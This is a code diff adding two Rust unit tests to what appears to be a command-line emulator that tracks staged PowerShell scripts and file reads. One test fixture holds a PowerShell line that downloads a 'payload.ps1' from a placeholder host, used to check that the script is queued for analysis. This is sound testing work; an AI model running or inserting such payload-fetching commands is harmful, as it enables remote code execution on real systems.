@@ -10617,6 +10617,26 @@ mod powershell_tests {
     }
 
     #[test]
+    fn powershell_file_current_dir_nested_tracks_script_content() {
+        let mut env = Environment::new(&Config::default());
+        let ps1 =
+            b"Invoke-WebRequest https://ps-file-current-dir-nested.example/payload.ps1".to_vec();
+        env.modified_filesystem.insert(
+            r#"temp\stage.ps1"#.to_string(),
+            FsEntry::Content {
+                content: ps1.clone(),
+                append: false,
+            },
+        );
+        interpret_line(r"powershell -NoProfile -File .\Temp\stage.ps1", &mut env);
+        assert!(
+            env.exec_ps1.iter().any(|payload| payload == &ps1),
+            "PowerShell nested current-dir -File script was not queued: {:?}",
+            env.exec_ps1
+        );
+    }
+
+    #[test]
     fn powershell_file_current_dir_nested_does_not_use_unrelated_basename_content() {
         let mut env = Environment::new(&Config::default());
         let wrong_ps1 =
@@ -13939,6 +13959,22 @@ mod synth_tests {
         );
 
         let lines = run_pipeline("type C:/Temp/stage.txt", &mut env);
+
+        assert_eq!(lines, vec!["alpha".to_string(), "beta".to_string()]);
+    }
+
+    #[test]
+    fn synth_type_current_dir_nested_reads_tracked_content() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            r#"temp\stage.txt"#.to_string(),
+            FsEntry::Content {
+                content: b"alpha\r\nbeta\r\n".to_vec(),
+                append: false,
+            },
+        );
+
+        let lines = run_pipeline(r"type .\Temp\stage.txt", &mut env);
 
         assert_eq!(lines, vec!["alpha".to_string(), "beta".to_string()]);
     }
